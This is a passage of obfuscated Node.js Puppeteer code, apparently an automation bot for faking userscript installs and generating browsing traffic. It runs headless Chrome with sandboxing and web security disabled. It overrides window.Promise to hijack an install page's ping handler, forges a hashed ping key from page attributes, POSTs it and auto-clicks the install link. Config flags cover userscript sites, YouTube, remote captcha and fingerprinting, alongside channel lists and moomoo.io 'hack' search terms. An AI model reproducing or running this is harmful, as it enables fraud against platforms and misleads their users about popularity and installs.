0xd1 * -0x15 + 0x3674 | L >> 0x1 * 0x178d + -0x9b * 0x6 + -0x13df & 0x23 * 0x13 + 0x242e * 0x1 + 0x18 * -0x19b) << y[0x1 * 0x579 + -0xbc5 + 0x64f & N++], P[N >> -0x9 * 0x2b + 0xca * 0x29 + -0x1ed5] |= (-0x33c + 0x59 * -0x56 + 0x21a2 | L >> 0xb * 0xc5 + -0x1723 + 0xeb2 & -0x1 * -0xa59 + 0x7 * -0x463 + 0x41f * 0x5) << y[0x45 * -0x56 + -0x21eb + 0x391c & N++], P[N >> 0x1061 + 0x151a + -0x2579] |= (0x2058 + 0xeb * 0x1c + -0x398c | 0x1df9 + -0x1a3f + 0x9 * -0x63 & L) << y[-0xeea + 0x17e3 + -0x8f6 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x151f * 0x1 + -0x2709 + 0xba * 0x19 ? (this['block'] = P[-0x1a4 + 0x1 * -0x341 + 0x4f5], this['start'] = N - (0x3 * -0x60b + 0x1 * 0x162d + -0x6c * 0x9), this['hash'](), this['hashed'] = 0x903 + -0x27 * -0x7f + -0x1c5b) : this['start'] = N;
                }
                return this['bytes'] > 0x120fd574 * 0x2 + 0x365bcd * 0x73f + -0x1434 * 0x89cf3 && (this['hBytes'] += this['bytes'] / (0x472fa388 * 0x1 + -0x3af23160 + -0x2b14b * -0x5a88) << 0x1344 + 0x1 * -0x226b + 0xf27, this['bytes'] = this['bytes'] % (-0x1a0bbcbd4 + 0xccfe7864 + -0xe9dea9b8 * -0x2)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xc7 * 0x13 + 0x1eaa + -0x2d6e;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1278 + -0x47 * -0x3b + -0x22c5] = this['block'], J[K >> -0x24cd + -0x1973 * 0x1 + 0xd * 0x4ca] |= x[0x23 * -0xc6 + 0x12af + 0x2 * 0x433 & K], this['block'] = J[-0x1c9 * 0xe + -0xd9b + 0x3 * 0xce3], K >= -0x1 * 0x1b46 + 0x89 * 0x3 + 0x19e3 && (this['hashed'] || this['hash'](), J[-0x2 * -0x12ef + 0xdc6 + 0x295 * -0x14] = this['block'], J[0x2e2 * 0x3 + -0x1ddb + -0x2d * -0x79] = J[0x9 * 0x44d + 0x1 * 0xca3 + -0x3357] = J[0x221 * 0x11 + -0x6a * 0x4b + -0x65 * 0xd] = J[0x9b0 + 0x6a3 * 0x2 + -0x5 * 0x497] = J[-0x1318 + 0x2166 + -0xe4a] = J[0x152a + -0xe * 0x23 + -0x133b] = J[-0x1d7 * -0x4 + -0x29 * 0x52 + 0x5cc] = J[-0x3 * -0x6a1 + -0x22a2 * 0x1 + 0xec6] = J[0xf8 + 0x3 * -0x37d + -0x32d * -0x3] = J[0x1 * 0x1be7 + 0x226 * 0x1 + 0x22 * -0xe2] = J[-0x19a6 + 0x227 * -0x7 + 0x1 * 0x28c1] = J[-0x23c2 + 0x8 * -0x4 + 0x1 * 0x23ed] = J[-0x70e + -0x1 * -0xd29 + 0x3 * -0x205] = J[0x1161 * -0x1 + 0x8d7 * -0x2 + -0x1ac * -0x15] = J[-0x5 * 0x577 + -0x902 + 0x2463] = J[0x1180 + -0x2f * 0xbd + 0x5e * 0x2f] = 0x12f6 + -0x365 + -0x5 * 0x31d), J[0x2299 + 0x2280 + -0x450b] = this['hBytes'] << -0x19e7 + -0x212b + 0x3b15 | this['bytes'] >>> -0x491 * -0x6 + -0x11 * -0x185 + -0x416 * 0xd, J[-0x1b34 + 0x9 * 0x7b + -0x4 * -0x5bc] = this['bytes'] << 0x524 + 0x25 * -0x2c + 0x13b, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1ae7 * 0x1 + -0x21af + -0x2 * -0x1e53; J < -0x1729 + 0x233e + -0xbc5; ++J)
                K = Q[J - (0xc5 * 0x17 + -0x2 * -0x598 + -0x2c * 0xa8)] ^ Q[J - (-0x123 * -0x15 + 0xe97 + -0x266e)] ^ Q[J - (0x2659 + 0x26b + -0x28b6)] ^ Q[J - (0x2 * 0x106a + 0x7c1 * 0x5 + -0x4789 * 0x1)], Q[J] = K << -0x3 * -0xaf1 + 0x5 * 0x619 + -0x13 * 0x355 | K >>> 0x10e4 + -0x1a * -0x53 + 0x1933 * -0x1;
              for (J = -0x1 * -0x1bca + -0x1ab * 0x7 + 0x5 * -0x339; J < -0x16af + 0x17ce + -0x1 * 0x10b; J += -0xf76 + -0x1f6 * -0x8 + -0x35)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x27d + 0x1d9c + -0x1b1a * 0x1 | L >>> -0x9fa * -0x1 + -0x205 + -0xa * 0xc9) + (M & N | ~M & O) + P + (-0x16 * 0x50e56f9 + 0xc * -0x76b812c + 0x122c8010f * 0x1) + Q[J] << 0xf54 + -0x21fb + 0x19 * 0xbf) << 0x55 * -0x5 + 0x15b0 + -0x1402 | P >>> -0x1c8e + -0x2 * 0x50d + -0x26c3 * -0x1) + (L & (M = M << 0xb1 * 0x27 + -0x1fc9 + 0x4f0 | M >>> -0x17 * 0x163 + 0x10fd * 0x1 + 0x775 * 0x2) | ~L & N) + O + (0x15 * 0x7ea1d51 + 0x2 * 0xd310ca6 + -0x66140758) + Q[J + (-0xb * 0x1bf + -0x1c64 + 0x2f9a)] << 0x1453 + 0x1ca3 + -0x2 * 0x187b) << 0xd78 + -0x15 * -0x69 + -0x1 * 0x1610 | O >>> 0x220c + -0x2d1 + 0x530 * -0x6) + (P & (L = L << -0x173b + 0xef + 0x166a | L >>> 0x6b1 * -0x1 + -0x208 * 0x13 + 0x2d4b) | ~P & M) + N + (0x1 * 0x72bf1747 + 0x69f7d06c * -0x1 + 0x28dd995f * 0x2) + Q[J + (0x10f1 * -0x2 + -0x22b5 + 0x4499 * 0x1)] << -0x20e9 + -0x5f * 0x14 + 0x5 * 0x811) << 0x34a * 0x7 + -0x78a * 0x1 + 0x1 * -0xf77 | N >>> -0x1826 + -0x1 * 0x3df + 0x64 * 0x48) + (O & (P = P << 0x9eb * -0x3 + 0x1246 * -0x2 + -0x7 * -0x97d | P >>> -0xc2b + -0x5bb * -0x1 + 0x672) | ~O & L) + M + (0xfef * -0x3f716 + -0x3 * -0x21817b0e + -0x2207ae1 * -0x19) + Q[J + (0x1 * -0x5ab + 0x168b + -0x10dd)] << -0x2280 + -0x3 * 0x902 + -0x465 * -0xe) << -0x227f + 0x1387 + 0xefd | M >>> -0x147e + -0x635 + 0x1ace) + (N & (O = O << 0x1 * -0xec5 + -0x23c3 + -0x871 * -0x6 | O >>> 0x33f * -0xb + -0x1b41 + 0x3ef8) | ~N & P) + L + (0x4b586042 + -0x1 * -0x9c570a8d + -0x8d2cf136) + Q[J + (-0x153c + -0x1a90 + 0x24 * 0x154)] << -0x7 * -0x6a + -0x937 + 0x651, N = N << 0x25 + 0x4 * -0x4c7 + 0x1315 | N >>> -0x1747 * -0x1 + -0x208d + -0x4 * -0x252;
              for (; J < -0x268a + 0x1 * -0x451 + 0x2b03; J += -0x860 + -0x32 * -0x78 + 0x1 * -0xf0b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x1eb + 0x6 * -0x272 + 0xcc6 | L >>> 0x110b + 0x1fc7 + -0x30b7) + (M ^ N ^ O) + P + (-0x4d866f * 0x124 + -0xb26a9755 + -0x7e7a * -0x2fc7d) + Q[J] << 0x13 * -0x16f + 0x49e + 0x169f) << -0x1 * 0x1ba + 0xdb * 0x21 + -0x1a7c | P >>> -0x8 * -0x3c4 + -0x2486 + -0x9 * -0xb9) + (L ^ (M = M << -0x1c6c + 0x99 + 0x1bf1 | M >>> 0x1d9c + -0x2 * 0x1f3 + -0x8c * 0x2f) ^ N) + O + (0xade15dff + -0x94acc4fd * 0x1 + 0x55a5529f) + Q[J + (-0x885 * 0x1 + 0x1ed3 + 0x1 * -0x164d)] << -0x1 * -0x1054 + 0x23a6 + 0x19fd * -0x2) << -0xcc3 * -0x1 + 0x1334 * -0x1 + -0x2 * -0x33b | O >>> -0x1ffd + -0x1a * 0x11b + 0x1 * 0x3cd6) + (P ^ (L = L << -0x3ee + -0x1333 + 0xb * 0x21d | L >>> 0x1e9f + 0xd * 0x16a + -0x30ff) ^ M) + N + (0x3a08f525 * -0x3 + -0xca7801c + 0x1066 * 0x122612) + Q[J + (-0x1748 + 0x13e2 + 0x368)] << 0x1e2 * -0x9 + -0x1bd6 + 0x2 * 0x1664) << -0xdf8 + -0x17a8 + 0x25a5 | N >>> -0x10bb + 0x251e + -0x1d8 * 0xb) + (O ^ (P = P << -0xca + 0xef + -0x7 | P >>> -0x1e67 * -0x1 + -0x1 * -0x2483 + -0x4 * 0x10ba) ^ L) + M + (-0xbede1819 + -0x3bdbdb41 + 0x16993defb) + Q[J + (0x1 * 0xd8d + -0x1197 * -0x1 + -0x1f21)] << 0x1266 + 0x7ba * 0x3 + 0xddc * -0x3) << -0x309 + 0x141b * 0x1 + -0x9 * 0x1e5 | M >>> 0xac6 + -0x5ab + 0x100 * -0x5) + (N ^ (O = O << -0x1183 * -0x1 + -0x5 * -0x73b + -0x358c | O >>> 0x79f * 0x1 + -0x5bc * 0x1 + -0x1e1) ^ P) + L + (0x1be * 0x4ea633 + -0x6ed387e4 + 0x66b * 0xd30c1) + Q[J + (0x29 * 0x5 + 0x537 + -0x600)] << 0x1ad6 + 0x108c + -0x9 * 0x4d2, N = N << 0x1 * -0x13c5 + 0x223e + -0xe5b | N >>> -0xb29 + 0x205f + -0x1534;
              for (; J < 0x1247 * -0x1 + -0xf49 * -0x1 + 0x1 * 0x33a; J += 0xe40 * -0x2 + -0x136a + 0x6d9 * 0x7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4fd + 0x1f2 * -0x6 + -0x34 * -0x21 | L >>> 0x1aba + 0x17 * 0x1af + -0xf6 * 0x44) + (M & N | M & O | N & O) + P - (-0x7260ebbf + 0x4 * -0x20481ef3 + 0x16465aaaf) + Q[J] << 0x3 * -0xbcf + -0x3 * -0x4e3 + 0xa62 * 0x2) << 0x403 + -0x2064 + 0x1c66 | P >>> 0x197 * 0x3 + -0x209a + 0x1bf0 * 0x1) + (L & (M = M << -0x2686 * 0x1 + 0x11e6 + 0x14be | M >>> 0x1042 + 0x6 * 0x3eb + -0x27c2) | L & N | M & N) + O - (-0xff * 0xde8833 + -0x964d403e + 0x1 * 0x1e4db2e2f) + Q[J + (0xd08 + 0x17a7 + 0xc3a * -0x3)] << 0x811 * -0x4 + 0xba5 + 0x149f * 0x1) << -0x7d + -0x7 * 0x28d + 0x125d | O >>> 0x1 * -0x1bd + 0x31 * -0x7a + 0x1932) + (P & (L = L << -0x1c4 * 0x1 + 0x25 * 0x96 + 0x4f3 * -0x4 | L >>> 0xda * 0xb + -0x18c + -0x7d0) | P & M | L & M) + N - (-0x6b9 * 0x1fc4f4 + -0x7a727749 + 0x1c0e9c6c1) + Q[J + (-0x1 * -0x191 + 0xf45 + -0x2 * 0x86a)] << -0x8e5 * 0x3 + 0x21be + -0x70f) << -0x1b43 * -0x1 + 0x32 * -0x9 + -0x197c | N >>> -0x8 * -0x3d4 + -0xd53 + -0x1132) + (O & (P = P << 0x1857 + 0x716 * -0x1 + -0x29 * 0x6b | P >>> 0x14e * -0x11 + 0xc95 * 0x3 + 0x7 * -0x239) | O & L | P & L) + M - (0x3b564c37 + 0xd73af252 + -0xaf * 0xec822b) + Q[J + (-0x5d5 + -0xf05 + 0x1 * 0x14dd)] << 0x117d + 0x52 * 0x45 + -0x2797) << -0x374 + 0x3cc + 0x1 * -0x53 | M >>> -0x17 * -0x65 + 0x1d5b + -0x2653) + (N & (O = O << -0x557 + -0x176a + 0x1 * 0x1cdf | O >>> -0x19a + 0x1cf * 0x5 + -0xad * 0xb) | N & P | O & P) + L - (-0xa966d98c + -0x1960205 * 0x81 + 0x1e6e22135) + Q[J + (-0x122 * 0xa + 0x153c + -0x9e4)] << 0x2b * 0x9b + -0x32e + -0x1 * 0x16db, N = N << -0x9ac * 0x1 + 0x385 * -0x8 + 0x12f9 * 0x2 | N >>> 0x20ee + 0x1e93 + -0x3f7f;
              for (; J < -0x22b3 + -0x1 * 0xa3d + 0x2d4 * 0x10; J += -0x14c4 + -0x1e1 * -0x11 + -0xb28)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x19d0 + -0x1bab + -0x1ac0 * -0x2 | L >>> -0x2301 + -0xa61 + -0x5 * -0x919) + (M ^ N ^ O) + P - (0x475cb59e + -0x5b7cdcbb + 0x49bd6547) + Q[J] << 0x221a + -0x227c + -0x1 * -0x62) << 0x1 * 0x70f + 0x115f * -0x1 + -0x211 * -0x5 | P >>> 0x2091 + -0xc1 * -0x7 + 0x1 * -0x25bd) + (L ^ (M = M << -0x19d8 + 0x1 * 0x4ff + 0x14f7 | M >>> 0x2493 + 0x2 * -0x9d + -0x1 * 0x2357) ^ N) + O - (-0x49aa2dc9 * 0x1 + -0x16dfa7f * -0xb + 0x6f8da87e) + Q[J + (-0x241d + -0x1bc5 + 0x3fe3)] << 0x1ce6 + -0x1685 * 0x1 + -0x661 * 0x1) << -0x1997 * -0x1 + 0x664 + -0xffb * 0x2 | O >>> -0xea7 * -0x1 + 0x1 * -0x9ff + -0x48d) + (P ^ (L = L << 0xb03 * 0x1 + -0x4c1 * 0x1 + -0x624 | L >>> 0x3d * -0x80 + -0x62 * 0x62 + -0x2 * -0x2203) ^ M) + N - (-0x5846aca6 + 0x1 * -0x22e522a7 + 0xb0c90d77) + Q[J + (0x19c3 * 0x1 + -0x13f4 + -0x5cd)] << 0x151b + 0x1 * -0x134f + -0x1cc) << 0x8e8 + -0x1 * 0x1d3 + 0x2 * -0x388 | N >>> 0x1b3e + 0x5ec * 0x1 + -0xd * 0x28b) + (O ^ (P = P << 0x1ef1 + 0x1322 + 0xcb * -0x3f | P >>> 0x2b * -0x29 + -0x4 * 0x8ef + 0x2aa1) ^ L) + M - (0x21d1a395 + -0x3bcc145 * -0x5 + 0x11bd43c) + Q[J + (-0x1 * -0x835 + 0xb63 + -0x1395)] << 0x1 * -0xfd7 + -0x1df5 * 0x1 + -0x7a2 * -0x6) << 0x2a1 * -0xb + 0x1a8c + 0x6 * 0x66 | M >>> 0x4e9 + -0x1 * 0x6a1 + 0x1d3) + (N ^ (O = O << -0xf7e + -0x5e3 + -0x157f * -0x1 | O >>> 0xb12 + 0x1 * -0x1f1e + 0x140e) ^ P) + L - (-0x19 * 0x272c699 + 0x6b90fed * -0x3 + 0x86fdd2e2) + Q[J + (0x1 * -0x526 + 0x1 * 0x1005 + -0xadb)] << -0x5a9 + 0xc41 + -0x698, N = N << 0x12d2 + -0x1751 + 0x49d | N >>> -0xa54 + 0x1 * 0x16db + -0xc85;
              this['h0'] = this['h0'] + L << 0x1781 * -0x1 + -0x6a * 0x10 + 0x9 * 0x359, this['h1'] = this['h1'] + M << 0x32 * 0x1 + 0x289 + -0x2bb, this['h2'] = this['h2'] + N << -0x42d + 0x38f + 0x4f * 0x2, this['h3'] = this['h3'] + O << -0x3 * 0xbdd + 0x32 + 0xd * 0x2b9, this['h4'] = this['h4'] + P << 0x143b * -0x1 + -0xe58 + -0x1 * -0x2293;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1e8 * 0x10 + -0xd13 + 0x193 * -0xb & 0x2273 + 0x2d7 * -0x7 + -0xe83] + w[J >> -0x13f5 + -0x67b + 0x8 * 0x351 & 0x1702 + 0x1 * -0xb5d + 0x1 * -0xb96] + w[J >> 0x4 * 0x3e2 + -0x1d85 + 0xe11 & -0x148b * -0x1 + 0x17d7 + 0x2c53 * -0x1] + w[J >> -0x1f70 + -0x20 * -0x8 + 0x1 * 0x1e80 & 0x4a * -0x81 + -0x8f0 + -0x121 * -0x29] + w[J >> -0x198c + -0x1b9a + 0x3532 & 0x1 * 0xdab + -0x84b * -0x3 + -0x267d] + w[J >> -0x7 * 0x212 + 0x1d2e + -0xea8 & 0x1 * 0x52 + 0x4 * -0x14c + -0x4ed * -0x1] + w[J >> -0x67b + 0x10 * -0x23f + 0x99 * 0x47 & 0x1c46 + -0x458 + 0x17df * -0x1] + w[0xa6e + -0x157a * 0x1 + -0x1 * -0xb1b & J] + w[K >> -0x2198 + 0x4 * 0x1cf + -0x69e * -0x4 & 0x2 * -0x6f + -0x2252 + 0x233f] + w[K >> -0x218 * 0x10 + 0x20df + 0xb9 & 0x50 * 0x22 + 0x3ea * -0x8 + 0x2f * 0x71] + w[K >> 0x82a + 0x1d9 + -0x1 * 0x9ef & -0x91 * 0x29 + -0x1e3a + 0x1ac1 * 0x2] + w[K >> -0x2115 + 0x25 * -0x3c + 0x29d1 & 0x180c + 0x3 * -0x54b + -0x81c] + w[K >> -0x1891 + 0x71 * -0x49 + -0x12f2 * -0x3 & 0x54 * -0x20 + 0x2025 + -0x133 * 0x12] + w[K >> 0x1 * -0x3a6 + 0x35 * 0x4 + -0x92 * -0x5 & 0x7 * 0x581 + -0x4 * 0x692 + -0xc30] + w[K >> 0x184 * 0x13 + -0x2053 + 0x38b * 0x1 & 0xc6b + 0x1 * 0x2237 + -0x2e93] + w[-0x54c + 0x14bc + -0x7f * 0x1f & K] + w[L >> 0x484 * -0x2 + -0xd58 + 0x4 * 0x59f & -0x1ae6 * -0x1 + -0xee + -0x19e9] + w[L >> -0x96d + 0x1b9c + -0x1 * 0x1217 & 0x16f * 0xe + 0x1436 + 0x1 * -0x2839] + w[L >> 0x3 * 0x3eb + -0xa49 * 0x3 + 0x997 * 0x2 & 0x2 * 0x5bc + -0x398 + 0x17 * -0x57] + w[L >> -0x2104 + 0x6a * -0x52 + 0x186 * 0x2c & 0x1b * 0xdb + -0x14e5 + 0x1 * -0x225] + w[L >> 0x1 * -0x24c1 + -0x25b + 0x2728 & -0x6b5 * -0x3 + 0x22d2 + -0x57d * 0xa] + w[L >> -0x6 * 0x47f + 0x421 * 0x3 + -0x1 * -0xe9f & 0x155 * 0x17 + 0x121c + -0x30b0] + w[L >> 0x1 * -0x795 + 0x5 * -0x2d3 + -0x28 * -0x8b & 0x11 * 0x1cf + 0x21d7 + 0x1 * -0x4087] + w[-0x1 * 0xb5 + 0x142b + 0x1367 * -0x1 & L] + w[M >> 0x2 * 0x101e + -0x1895 + -0x78b & 0xc10 + -0x1021 + 0x420] + w[M >> -0xf4e + -0xa84 + 0xd6 * 0x1f & -0x13f1 + -0x4f * -0x31 + 0x4e1] + w[M >> -0x16b8 + -0xe29 + 0x24f5 * 0x1 & -0x2 * -0xfa9 + -0x2 * 0xb85 + -0x839] + w[M >> 0xea + -0x18fc + 0x1822 & -0x23ec + 0x960 + -0x7 * -0x3cd] + w[M >> 0x144b + -0x105 * -0x22 + -0x36e9 & 0xc5 * -0x18 + 0x2256 + 0x3 * -0x545] + w[M >> 0x5c6 + 0x41e + 0x4 * -0x277 & 0x1155 + 0x1 * 0x1124 + 0x1 * -0x226a] + w[M >> 0xb65 + -0x1cca + 0x1169 & 0x1915 + 0xaa1 * -0x2 + -0x3c4] + w[-0x1614 + 0x3 * 0xbc5 + -0xd2c & M] + w[N >> 0x815 * 0x2 + -0x9ac * -0x4 + -0x4fa * 0xb & -0xa01 + -0x23d * -0x9 + -0xa15] + w[N >> 0xa * -0x244 + 0x2302 + -0x6 * 0x20b & -0x3f8 + 0x24ad + 0x2a * -0xc7] + w[N >> 0xdbf + 0x3 * -0x4fa + 0x11 * 0x13 & 0xf27 * -0x1 + -0x1 * 0x293 + 0x11c9] + w[N >> -0x21be + 0x151a + -0x65a * -0x2 & -0x9 * 0x1c0 + 0x14c3 * 0x1 + -0x13d * 0x4] + w[N >> 0xc7 * 0x2e + 0x1603 + 0x1 * -0x39b9 & 0x6e1 + -0xb * -0x4b + -0x3 * 0x359] + w[N >> -0x1000 * 0x1 + -0x1 * 0x1c41 + -0x2c49 * -0x1 & -0x927 + -0x120b * 0x1 + 0x1b41] + w[N >> -0x221d + -0x18d6 + 0x3af7 & 0x49d * 0x6 + -0x1321 * -0x1 + 0x1760 * -0x2] + w[0x2 * 0x417 + 0x679 * 0x2 + -0x1 * 0x1511 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x241 + 0x150c + -0x12b3 & 0x156e + 0xee0 + 0x3 * -0xbc5,
                J >> 0xf4e * -0x1 + -0x235b + -0x109 * -0x31 & 0xc1 + 0x58b * 0x1 + -0x54d,
                J >> 0x101c + 0x601 * 0x2 + 0x1c16 * -0x1 & 0x10f5 * 0x2 + -0x2229 + 0x13e,
                -0x54 + 0x43a * -0x8 + 0x2323 & J,
                K >> -0x1 * -0x1316 + 0x1370 * 0x1 + -0x266e & 0x1 * 0xa6f + 0x1 * -0x1af3 + 0x1183 * 0x1,
                K >> -0x23c9 + -0xf8 + 0x24d1 & -0x6 * 0x67d + -0x4 * -0x52f + 0x1331,
                K >> -0x1069 * 0x1 + -0x1 * -0xefd + -0x7c * -0x3 & 0x74e + -0x3 * -0x67a + -0x19bd,
                -0x40e * -0x3 + -0x2 * 0x9b + -0x9f5 & K,
                L >> -0x131e + -0x15c1 * -0x1 + -0x1f * 0x15 & -0x57d * 0x1 + -0x1d73 + 0x23ef,
                L >> 0x2 * -0x31d + -0x16d9 + -0x1 * -0x1d23 & 0x104b * -0x1 + 0x1 * 0x142b + -0x2e1,
                L >> -0x1 * -0xd49 + -0x1ee * -0x3 + -0x130b & 0x13e8 + 0x1b59 + -0x2e42,
                0x1dda * 0x1 + -0x1db * -0xd + 0x1 * -0x34fa & L,
                M >> -0x63e + 0x167e * 0x1 + -0x1028 & 0x1f43 + 0x590 * 0x5 + 0x213 * -0x1c,
                M >> -0x1 * -0x160d + 0x2bb * -0x5 + 0xb * -0xc2 & -0xd58 + 0x43c + 0xa1b,
                M >> 0x1529 + -0x1c6a * 0x1 + 0x175 * 0x5 & -0x98a + 0x2 * 0xbd3 + 0x175 * -0x9,
                -0x2281 + -0x575 + 0xda7 * 0x3 & M,
                N >> -0x22a5 + 0xca1 + 0x161c & 0x15e5 + -0x17 * -0x1b1 + -0x3bcd * 0x1,
                N >> 0x24fb + -0x954 + -0x1b97 & -0x2d * -0xaa + 0x1 * 0x129e + 0x2f81 * -0x1,
                N >> 0x2 * 0x1072 + -0x1 * -0xcd7 + -0x2db3 & -0x2d * -0xcd + 0x4 * 0x36f + -0x30c6 * 0x1,
                -0x11b * 0x9 + 0x856 + 0x29c & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x7 * -0x49 + 0x50 * -0x2d + 0x1023), (K = new DataView(J))['setUint32'](0xe9 * 0x27 + -0x55f * -0x2 + -0x2e3d, this['h0']), K['setUint32'](0x1e7 * -0x8 + 0x1 * -0x11f5 + 0x1d * 0x125, this['h1']), K['setUint32'](0x1f98 + -0x20bc + 0xf * 0x14, this['h2']), K['setUint32'](0x135a + -0xfb * -0x3 + -0x163f, this['h3']), K['setUint32'](0x1955 + -0x6ee * 0x1 + -0x1 * 0x1257, this['h4']), J;
            }
        }
        G['prototype'][Y(0x12)] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x3fa * 0x7 + 0x17c8 + 0x2 * -0x19cf];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x6 * -0x51c + 0xdc0 + 0x10e8;
            J[0x113f + 0x2007 + -0x3146]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1b97 * -0x1 + -0x3f * -0x47 + -0x103 * -0xa] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x18db + -0x15a * 0xd + -0x2 * -0x1537), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x91a + 0x2596 + -0x1c7b;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0xc7e + -0xd * 0x62 + 0x1754), Promise['resolve'](0x5fd * 0x2 + 0x1fa1 + -0x2b9a);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1345 * -0x1 + 0x1a3a + -0xd * 0x89; j < 0x9 * 0x181 + -0xc9a + -0xee; j++)
    i();
}
const NETWORK_PATIENCE = 0x3ae * -0x9 + 0x314a + 0xf14 + (0x1 * -0xc95 + 0x3fd + 0x1450) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x942 + 0x191e + -0x1 * 0xfd9) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x25 * 0xe9 + 0x734 * -0x5 + 0x1 * 0x45b1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), 